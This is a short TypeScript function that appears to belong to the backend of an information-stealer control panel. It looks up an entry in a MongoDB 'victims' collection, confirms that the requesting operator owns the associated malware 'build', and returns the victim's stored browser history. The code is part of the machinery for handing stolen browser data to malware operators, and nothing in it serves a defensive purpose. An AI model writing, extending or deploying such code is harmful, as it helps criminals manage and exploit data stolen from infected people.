import type { IHistory } from '@/interfaces';
import type { Db } from 'mongodb';
import { getBuildId } from '@/server';
export const getHistory = async (db: Db, owner: string, id: string) => {
  const collection = db.collection('victims');

  const victim = await collection.findOne({
    tokens: {
      $elemMatch: {
        id: id
      }
    }
  });

  if (!victim) throw Error('This victim does not exist!');
  const build = await getBuildId(db, victim.id, owner);
  if (build.owner.id !== owner) throw Error('This victim is not your property');

  const history: IHistory[] = victim.browsers.history ?? null;
  return history;
};
